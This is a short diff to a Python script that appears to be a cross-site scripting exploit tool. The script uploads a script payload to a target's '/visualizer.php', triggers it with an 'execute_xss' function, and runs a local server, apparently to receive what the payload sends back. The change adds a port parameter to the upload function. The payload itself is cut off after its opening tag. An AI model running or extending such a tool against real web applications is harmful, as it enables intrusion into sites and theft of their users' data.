@@ -37,7 +37,7 @@ def run_server_in_thread(ip, port):
     return server_thread
 
 
-def upload_file(target, ip, file, proxy):
+def upload_file(target, ip, port, file, proxy):
     upload_url = f"{target}" + "/visualizer.php"
     payload = f"""
     <script>
@@ -109,7 +109,7 @@ if __name__ == "__main__":
                 break
             if file == "":
                 continue
-            xss_url = upload_file(target, ip, file, proxy)
+            xss_url = upload_file(target, ip, port, file, proxy)
             execute_xss(target, xss_url)
             time.sleep(1)
     except KeyboardInterrupt:
